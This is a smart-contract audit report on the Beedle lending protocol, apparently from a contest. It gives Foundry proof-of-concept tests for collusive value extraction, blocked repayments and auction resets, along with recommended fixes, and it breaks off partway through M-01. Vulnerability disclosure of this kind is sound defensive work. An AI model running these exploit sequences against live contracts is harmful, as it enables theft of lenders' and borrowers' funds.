# Beedle - Oracle free perpetual lending - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Deposits to `Lender.sol` won't work correctly with fee-on transfers tokens](#H-01)
    - ### [H-02. Lender and borrower maliciously can extract value from the protocol using a malicious pool with tokens that may be worth nothing](#H-02)
    - ### [H-03. The borrower repayment can be blocked by a malicious actor who doesn't have a created pool](#H-03)
    - ### [H-04. Malicious borrower can restart the loan's auction using the `refinance()` function](#H-04)
    - ### [H-05. In the `refinance()`, the new pool, whoever takes the loan, his balance will be subtracted twice](#H-05)
    - ### [H-06. Slippage parameter is not specified correclty in the `Fees::sellProfits()` function](#H-06)
    - ### [H-07. Malicious borrower can restart the loan auction via `buyLoan()` causing the lender to be unable to receive the auction payment or the loan collateral](#H-07)
- ## Medium Risk Findings
    - ### [M-01. Borrower may end up paying non-agreed interests using the `refinance()` function](#M-01)
    - ### [M-02. Malicious lender can frontrun `borrow()` function and make borrowers to pay more interests](#M-02)
    - ### [M-03. Malicious lender can increment the loan interest using the auction process](#M-03)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: BeedleFi

### Dates: Jul 23rd, 2023 - Aug 6th, 2023

[See more contest details here](https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 7
   - Medium: 3
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Deposits to `Lender.sol` won't work correctly with fee-on transfers tokens            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L182

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L152

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L271

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L642

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L663

## Summary

The `Lender.sol` contract won't work correctly with fee-on transfer tokens.

## Vulnerability Details

Fee-on transfer tokens can charge a certain fee in every `transfer()` or `transferFrom()` functions.

The problem is that the code does not control correctly the amount deposited to the `Lender.sol` contract. E.g. the [addPool()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L182) function helps to the lender to add tokens to lender's pool, if the lender is using a fee-on transfer `loanToken`, the `Lender` contract will end up with less tokens than the `amount` value, so the  update pool balance `_updatePoolBalance(poolId, pools[poolId].poolBalance + amount);` will not be the correct amount.

```solidity
File: Lender.sol
182:     function addToPool(bytes32 poolId, uint256 amount) external {
183:         if (pools[poolId].lender != msg.sender) revert Unauthorized();
184:         if (amount == 0) revert PoolConfig();
185:         _updatePoolBalance(poolId, pools[poolId].poolBalance + amount);
186:         // transfer the loan tokens from the lender to the contract
187:         IERC20(pools[poolId].loanToken).transferFrom(
188:             msg.sender,
189:             address(this),
190:             amount
191:         );
192:     }
```

## Impact

The `Lender` contract will end up with less token amount when users use fee-on transfer tokens.

## Tools used

Manual review

## Recommendations

Measure the balance before and after the transfer actions and update the correct pool balance amount. Another option is the restriction of allowed tokens in the `Lender.sol` contract.
## <a id='H-02'></a>H-02. Lender and borrower maliciously can extract value from the protocol using a malicious pool with tokens that may be worth nothing            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

## Summary

The lender and borrower may be colluding in order to extract value from the protocol using the `buyLoan()` function.

## Vulnerability Details

The [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) function helps to buy a loan using the specified pool. The problem is that `buyLoan()` function does not validate that the loan tokens (loanToken, collateralToken) are the same that the pool tokens (loanToken, collateralToken) who will take the loan.

Please see the next test where the lender, borrower and the attacker can be colluded or be the same person and extract value from the protocol. At the end the borrower will not repay the debt, the lender will extract money from the protocol and the debt will be acquired by the malicious pool which has worthless tokens:

1. `Lender1` (malicious actor) creates the legitimate pool with initial 1000 token balance. `Borrower` (malicious actor) borrows 100 token debt.
2. `Attacker` creates his pool using malicious tokens (tokens that may be worth nothing).
3. `Lender1` (malicious actor) kicks off the auction.
4. The `Attacker` call the `buyLoan()` function using his `malicious pool`.
5. The `Lender1` (malicious actor) pool has the loaned amount + interests. `Lender1` (malicious actor) can withdraw all his pool balance money.
6. The `malicious pool` has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests.
   The `lender1` (malicious actor) withdraw his initial deposit (1000 legitimate tokens).
   The `borrower` (malicious actor) does not repay the debt (100 legitimate tokens).
   The `malicious pool` has the debt with custom (malicious) tokens that may be worth nothing.

At the end lender1 and borrower maliciously extract 100 tokens from the protocol.

```solidity
// File: test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_buyLoan_using_different_tokens" -vvv
//
   function test_buyLoan_using_different_tokens() public {
        // Lender and borrower maliciously can extract value from the protocol using a malicious pool with tokens that may be worth nothing.
        // 1. Lender1 (malicious actor) creates the pool with initial 1000 token balance. Borrower (malicious actor) borrows 100 token debt.
        // 2. Attacker creates his pool using malicious tokens (tokens that may be worth nothing).
        // 3. Lender1 (malicious actor) kicks off the auction.
        // 4. The Attacker call the buyLoan() function using his malicious pool.
        // 5. The Lender1 (malicious actor) pool has the loaned amount + interests. Lender1 (malicious actor) can withdraw all his pool balance money..
        // 6. The malicious pool has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests.
        //    The `lender1` (malicious actor) withdraw his initial deposit (1000 legitimate tokens).
        //    The `borrower` (malicious actor) does not repay the debt (100 legitimate tokens).
        //    The malicious pool has the debt with custom (malicious) tokens that may be worth nothing.
        //
        address attacker = address(1337);
        TERC20 maliciousLoanToken = new TERC20();
        TERC20 maliciousCollateralToken = new TERC20();
        maliciousLoanToken.mint(address(attacker), 100000*10**18);
        maliciousCollateralToken.mint(address(attacker), 100000*10**18);
        //
        // There are others pools who deposit to the protocol
        vm.startPrank(lender2);
        Pool memory lender2Pool = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(lender2Pool);
        //
        // 1. Lender1 (malicious actor) creates the pool with initial 1000 token balance. Borrower (malicious actor) borrows 100 token debt.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        // assert loan debt and pool balance
        assertEq(lender.getLoanDebt(0), 100*10**18);
        assertEq(poolBalance, 900 * 10**18);
        //
        // 2. Attacker creates his pool using malicious tokens (tokens that may be worth nothing).
        //
        // attacker creates his pool
        vm.startPrank(attacker);
        maliciousLoanToken.approve(address(lender), 1000000*10**18);
        maliciousCollateralToken.approve(address(lender), 1000000*10**18);
        Pool memory maliciousPool = Pool({
            lender: attacker,
            loanToken: address(maliciousLoanToken),
            collateralToken: address(maliciousCollateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 maliciousPoolId = lender.setPool(maliciousPool);
        //
        // 3. Lender1 (malicious actor) kicks off the auction.
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);
        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);
        //
        // 4. The Attacker call the buyLoan() function using his malicious pool.
        //
        vm.startPrank(attacker);
        lender.buyLoan(0, maliciousPoolId);
        //
        // 5. The Lender1 (malicious actor) pool has the loaned amount + interests. Lender1 (malicious actor) can withdraw all his pool balance money..
        //
        // assert lender1 pool balance is 1000 + interests
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        assertGt(poolBalance, 1000 * 10**18); // 1000 + interests (assertGt)
        vm.prank(lender1);
        lender.removeFromPool(poolIdLender1, 1000 * 10**18);
        //
        // 6. The malicious pool has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests.
        //    The `lender1` (malicious actor) withdraw his initial deposit (1000 legitimate tokens).
        //    The `borrower` (malicious actor) does not repay the debt (100 legitimate tokens).
        //    The malicious pool has the debt with custom (malicious) tokens that may be worth nothing.
        //
        (,,,,poolBalance,,,,) = lender.pools(maliciousPoolId);
        assertLt(poolBalance, (1000 - 100) * 10**18); // poolBalance < (1000 - 100 - borrow interests)
    }
```

## Impact

The protocol will lost money by malicious actors who can extract value using malicious pool.

## Tools used

Manual review

## Recommendations

Validates that the pool, whoever is assigned the debt, is using the same `loanToken` and `collateralToken` tokens that the loan has.

```diff
    function buyLoan(uint256 loanId, bytes32 poolId) public {
        // get the loan info
        Loan memory loan = loans[loanId];
        // validate the loan
        if (loan.auctionStartTimestamp == type(uint256).max)
            revert AuctionNotStarted();
        if (block.timestamp > loan.auctionStartTimestamp + loan.auctionLength)
            revert AuctionEnded();
        // calculate the current interest rate
        uint256 timeElapsed = block.timestamp - loan.auctionStartTimestamp;
        uint256 currentAuctionRate = (MAX_INTEREST_RATE * timeElapsed) /
            loan.auctionLength;
        // validate the rate
        if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();
        // calculate the interest
        (uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(
            loan
        );

        // reject if the pool is not big enough
        uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
        if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();

++      if (pools[poolId].loanToken != loan.loanToken) revert TokenMismatch();
++      if (pools[poolId].collateralToken != loan.collateralToken) revert TokenMismatch();
```
## <a id='H-03'></a>H-03. The borrower repayment can be blocked by a malicious actor who doesn't have a created pool            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

## Summary

The borrower repayment can be blocked by a malicious actor who doesn't have a created pool causing the pool that acquired the debt to be unable to be paid and the borrower to be unable to get his collateral.

## Vulnerability Details

The [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) function helps "buy" a loan and transfer it to another pool. So the first pool will be paid plus interests and the new pool will acquire the debt.

The problem is that a malicious actor, who doesn't have any created pool, can call the `buyLoan()` function and transfer the debt to another whatever pool. That will cause that the loan repayment will be reverted by an arithmetic error.

I created a test where the malicious actor make the borrower repayment to be reverted by an arithmetic error. Test steps:

1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
2. Lender2 creates his pool.
3. Lender1 kicks off the auction.
4. The malicious actor (address(1337)) call the `buyLoan()` function using Lender2's pool.
5. The Lender1 pool has the loaned amount + interests.
6. Lender2 pool has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests
7. The loan lender is assigned to the attacker non-existent pool which means that
   the repay() function will be reverted by arithmeticError.

```solidity
// File: test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_borrower_repayment_can_be_blocked" -vvv
//
    function test_borrower_repayment_can_be_blocked() public {
        // The borrower repayment can be blocked by a malicious actor who doesn't have a created pool
        // causing the pool that acquired the debt to be unable to be paid.
        // 1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
        // 2. Lender2 creates his pool.
        // 3. Lender1 kicks off the auction.
        // 4. The malicious actor (address(1337)) call the buyLoan() function using Lender2's pool.
        // 5. The Lender1 pool has the loaned amount + interests.
        // 6. Lender2 pool has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests
        // 7. The loan lender is assigned to the attacker non-existent pool which means that
        //    the repay() function will be reverted by arithmeticError.
        address attacker = address(1337);
        loanToken.mint(address(attacker), 100000*10**18);
        collateralToken.mint(address(attacker), 100000*10**18);
        //
        // 1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        // assert loan debt and pool balance
        assertEq(lender.getLoanDebt(0), 100*10**18);
        assertEq(poolBalance, 900 * 10**18);
        //
        // 2. Lender2 creates his pool.
        //
        // Lender2 creates his pool
        vm.startPrank(lender2);
        Pool memory lender2Pool = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(lender2Pool);
        //
        // 3. Lender1 kicks off the auction.
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);
        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);
        //
        // 4. The malicious actor (address(1337)) call the buyLoan() function using Lender2's pool.
        //
        bytes32 poolIdLender2 = lender.getPoolId(lender2, address(loanToken), address(collateralToken));
        vm.startPrank(attacker);
        lender.buyLoan(0, poolIdLender2);
        //
        // 5. The Lender1 pool has the loaned amount + interests.
        //
        // assert lender1 pool balance is 1000 + interests
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        assertGt(poolBalance, 1000 * 10**18); // 1000 + interests (assertGt)
        //
        // 6. Lender2 pool has the debt. 1000 initial pool balance - 100 debt tokens - borrow interests
        //
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender2);
        assertLt(poolBalance, (1000 - 100) * 10**18); // poolBalance < (1000 - 100 - borrow interests)
        //
        // 7. The loan lender is assigned to the attacker non-existent pool which means that
        //    the repay() function will be reverted by arithmeticError.
        //
        vm.expectRevert(stdError.arithmeticError);
        lender.repay(loanIds);
    }
```

## Impact

The borrower repay will not be possible, causing the borrower collateral lost. Additionally the pool who acquired the debt will lost token balance because nobody will pay that debt.

## Tools used

Manual review

## Recommendations

The `pool.lender` should be [assigned](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L517C1-L518C43) to the `loans.lender` instead the `msg.sender`:

```diff
        // update the loan with the new info
--      loans[loanId].lender = msg.sender;
++      loans[loanId].lender = pools[poolId].lender;
```
## <a id='H-04'></a>H-04. Malicious borrower can restart the loan's auction using the `refinance()` function            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L692

## Summary

Malicious borrower can restart the loan's auction using the `refinance()` function causing the lender to be unable to receive neither the auction payment or the collateral.

## Vulnerability Details

The [refinance()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591) function helps to the borrower to transfer his loan to another pool. The borrower needs to [specify the new pool](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L594) who will take the loan.

The problem is that the new pool whoever takes the loan can be the same pool which has the loan, so a  malicious borrower can use the same pool the loan has causing that the [auction to be restarted](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L692).

I created a test where the auction is restarted (`auctionStartTime = type(uint256).max`) by a malicious borrower. Test steps:

1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
2. Lender1 kicks off the auction.
3. The borrower maliciously `refinance` the loan using the same old poolID from the Lender1.
   The malicious borrower doesn't need to deposit any token amount.
4. The Lender1 auction is restarted. The malicious borrower can repeat the process
   causing the lender to be unable to get the collateral.

```solidity
// File: test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_malicious_borrower_restart_auction_via_refinance" -vvv
//
    function test_malicious_borrower_restart_auction_via_refinance() public {
        // Malicious borrower can restart the loan auction using the refinance() function.
        // 1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
        // 2. Lender1 kicks off the auction.
        // 3. The borrower maliciously refinance the loan using the same old poolID from the Lender1.
        //    The malicious borrower doesn't need to deposit any token amount.
        // 4. The Lender1 auction is restarted. The malicious borrower can repeat the process
        //    causing the lender to be unable to get the collateral.
        //
        // 1. Lender1 creates the pool with initial 1000 token balance. Borrower borrows 100 token debt.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        // assert loan debt and pool balance
        assertEq(lender.getLoanDebt(0), 100*10**18);
        assertEq(poolBalance, 900 * 10**18);
        //
        // 2. Lender1 kicks off the auction.
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);
        (,,,,,,,,uint256 auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, block.timestamp);
        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);
        //
        // 3. The borrower maliciously refinance the loan using the same old poolID from the Lender1.
        //    The malicious borrower doesn't need to deposit any token amount.
        //
        vm.startPrank(borrower);
        Refinance memory r = Refinance({
            loanId: 0,
            poolId: poolIdLender1, //Same oldPoolId
            debt: 100 * 10**18,
            collateral: 100 * 10**18
        });
        Refinance[] memory rs = new Refinance[](1);
        rs[0] = r;
        lender.refinance(rs);
        //
        // 4. The Lender1 auction is restarted. The malicious borrower can repeat the process
        //    causing the lender to be unable to get the collateral.
        //
        (,,,,,,,,auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, type(uint256).max); // auction startTime is restarted
        // assert loan debt is still the same
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        assertEq(lender.getLoanDebt(0), 100*10**18);
    }
```

## Impact

The lender who started an auction will not receive neither the [auction payment](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) or the [loan collateral](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L548). The malicious borrower can make the attack at zero cost because as the above test shows, the loan debt is still the same (step 4). 

## Tools used

Manual review

## Recommendations

Add a validation in the [refinance()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591) function that the new `poolId`, who will take the loan, is not the same as the one that has the loan.
## <a id='H-05'></a>H-05. In the `refinance()`, the new pool, whoever takes the loan, his balance will be subtracted twice            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L636

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698

## Summary

There is a counting error in the [Lender.sol::refinance()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591) function causing losses to the new pool who takes the loan.

## Vulnerability Details


The [Lender.sol::refinance()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591) helps to the borrower to refinance his loan to a new offer (pool).

The problem is that the new pool, whoever takes the loan, his balance is substracted twice. First the balance is substracted [here](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L636):

```solidity
File: Lender.sol
635:             // now lets deduct our tokens from the new pool
636:             _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
```

and [here](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698) is subtracted one more time:

```solidity
File: Lender.sol
697:             // update pool balance
698:             pools[poolId].poolBalance -= debt;
```

I created a test where the new pool (initial pool balance of 1000 tokens) who takes the loan will end up with 800 token balance, which is incorrect because the loan debt is 100 tokens. Test steps:

1. Create a borrow in the first pool with 1000 balance. Borrower borrows 100 debt and put 100 collateral.
2. Lender2 creates a second pool with 1000 pool balance.
3. Borrower execute the refinance to the second pool with the same debt amount.
4. Assert first pool balance gets the 100 loaned amount, so the first pool balance is now 1000.
5. Assert second pool balance is substracted two times and the loan debt is still 100 tokens.
   The second pool should have a balance of 900 tokens not 800.

```solidity
// File: test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_refinance_double_subtract_error" -vvv
//
    function test_refinance_double_subtract_error() public {
        // The new pool, whoever takes the loan, his balance will be subracted twice.
        // 1. Create a borrow in the first pool with 1000 balance. Borrower borrows 100 debt and put 100 collateral.
        // 2. Lender2 creates a second pool with 1000 pool balance.
        // 3. Borrower execute the refinance to the second pool with the same debt amount.
        // 4. Assert first pool balance gets the 100 loaned amount, so the first pool balance is now 1000.
        // 5. Assert second pool balance is substracted two times and the loan debt is still 100 tokens.
        //    The second pool should have a balance of 900 tokens not 800.
        //
        //
        // 1. Create a borrow in the first pool with 1000 balance. Borrower borrows 100 debt and put 100 collateral.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        // assert loan debt, loan collateral and final pool balance
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        (,,,,,uint256 collaterlLoan,,,,) = lender.loans(0);
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
        assertEq(collaterlLoan, 100 * 10**18);
        assertEq(poolBalance, 900 * 10**18); // 1000 pool balance - 100 loan
        //
        // 2. Lender2 creates a second pool with 1000 pool balance.
        //
        vm.startPrank(lender2);
        Pool memory p = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        //
        // 3. Borrower execute the refinance to the second pool with the same debt amount.
        //
        bytes32 poolIdLender2 = lender.getPoolId(lender2, address(loanToken), address(collateralToken));
        vm.startPrank(borrower);
        Refinance memory r = Refinance({
            loanId: 0,
            poolId: poolIdLender2,
            debt: 100 * 10**18,
            collateral: 100 * 10**18
        });
        Refinance[] memory rs = new Refinance[](1);
        rs[0] = r;
        lender.refinance(rs);
        //
        // 4. Assert first pool balance gets the 100 loaned amount, so the first pool balance is now 1000.
        //
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        assertEq(poolBalance, 1000 * 10**18);
        //
        // 5. Assert second pool balance is substracted two times and the loan debt is still 100 tokens.
        //    The second pool should have a balance of 900 tokens not 800.
        //
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender2);
        assertEq(poolBalance, 800 * 10**18);  // wrong pool balance substraction
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
    }
```

## Impact

The new pool, whoever takes the loan, will lost balance. In the example above the borrower will pay 100 debt tokens but there are another 100 tokens that are lost and nobody will pay.

## Tools used

Manual review

## Recommendations

Remove the next lines:

```solidity
File: Lender.sol
697:             // update pool balance
698:             pools[poolId].poolBalance -= debt;
```
## <a id='H-06'></a>H-06. Slippage parameter is not specified correclty in the `Fees::sellProfits()` function            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L38

## Summary

The swap in [Fees::sellProfit()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26) is executed without specify the correct `amountOutMinimum` value, opening up to a loss of funds via front running sandwich or another type of price manipulation.

## Vulnerability Details

The [Fees::sellProfit()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26) function helps to make a swap using an [Uniswap Router](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L17C21-L17C63).

The problem is that the slippage [amountOutMinimum](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38) parameter is zero, that is extremely dangeraus because the `amountOutMInimum = 0` means that the caller accept zero as the minimum amount out tokens from the swap.

## Impact

Loss of funds via  front running sandwich or another type of price manipulation.

## Tools used

Manual review

## Recommendations

Follow the [Uniswap recommendation](https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps#swap-input-parameters) by calculating the correct price using an onchain oracle.
## <a id='H-07'></a>H-07. Malicious borrower can restart the loan auction via `buyLoan()` causing the lender to be unable to receive the auction payment or the loan collateral            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L521

## Summary

Malicious borrower/actor can restart the lender auction causing the lender to be unable to receive the auction payment or the loan's collateral.

## Vulnerability Details

The [Lender.sol:buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) function helps to anyone to buy a loan which is in auction process. The [poolId parameter](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L464) specify the poolId which will accept the loan.

The problem is that a malicious borrower can call the `buyLoan()` function using the same loan's `poolId` as a parameter. I created a test where the malicious borrower can restart the lender auction. Test steps:

1. Lender1 creates a pool and borrower borrows debt 100/collateral 100 from the Lender1.
2. Lender1 kicks off the auction.
3. The borrower maliciously buys the loan using the same old poolID from the Lender1.
   The malicious borrower doesn't need to deposit any token amount.
4. The Lender1 auction is restarted. The malicious borrower can repeat the process
   causing the lender to be unable to get the collateral.

```solidity
// test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_maliciousBorrower_restartAuction_viaBuyLoan" -vvv
//
    function test_maliciousBorrower_restartAuction_viaBuyLoan() public {
        // Malicious borrower can restart the loan auction causing that the lender to be unable to get the collateral
        // 1. Lender1 creates a pool and borrower borrows debt 100/collateral 100 from the Lender1.
        // 2. Lender1 kicks off the auction.
        // 3. The borrower maliciously buys the loan using the same old poolID from the Lender1.
        //    The malicious borrower doesn't need to deposit any token amount.
        // 4. The Lender1 auction is restarted. The malicious borrower can repeat the process
        //    causing the lender to be unable to get the collateral.
        //
        // 1. Lender1 creates a pool and borrower borrow debt 100/collateral 100 from the Lender1.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        // assert loan debt and pool balance
        assertEq(lender.getLoanDebt(0), 100*10**18);
        assertEq(poolBalance, 900 * 10**18);
        // accrue interest
        vm.warp(block.timestamp + 364 days + 12 hours);
        //
        // 2. Lender1 kicks off the auction.
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);
        (,,,,,,,,uint256 auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, block.timestamp);
        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);
        //
        // 3. The borrower maliciously buys the loan using the same old poolID from the Lender1.
        //    The malicious borrower doesn't need to deposit any token amount.
        //
        vm.startPrank(borrower);
        lender.buyLoan(0, poolIdLender1);
        //
        // 4. The Lender1 auction is restarted. The malicious borrower can repeat the process
        //    causing the lender to be unable to get the collateral.
        //
        (,,,,,,,,auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, type(uint256).max);
        // assert loan debt and pool balance
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        assertEq(lender.getLoanDebt(0), 110*10**18);
        assertEq(poolBalance, 899*10**18);
    }
```

## Impact

The malicious borrower/actor can restart the lender auction causing that the lender to be unable to get the loan collateral or to be unable to receive the auction payment. The malicious borrower/actor does not need to deposit money to perform the attack.

## Tools used

Manual review

## Recommendations

Validates that the pool which will accept the new loan is not the same pool which has the loan assigned.
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Borrower may end up paying non-agreed interests using the `refinance()` function            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688

## Summary

The borrower may end up paying non-agreed interests in the `refinance()` function.

## Vulnerability Details

The [refinance()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591) function helps to the borrower to transfer his debt to another pool. The borrower sends the next data:

```solidity
struct Refinance {
    /// @notice the loan ID to refinance
    uint256 loanId;
    /// @notice the pool ID to refinance to
    bytes32 poolId;
    /// @notice the new desired debt amount
    uint256 debt;
    /// @notice the new desired collateral amount
    uint256 collateral;
}
```

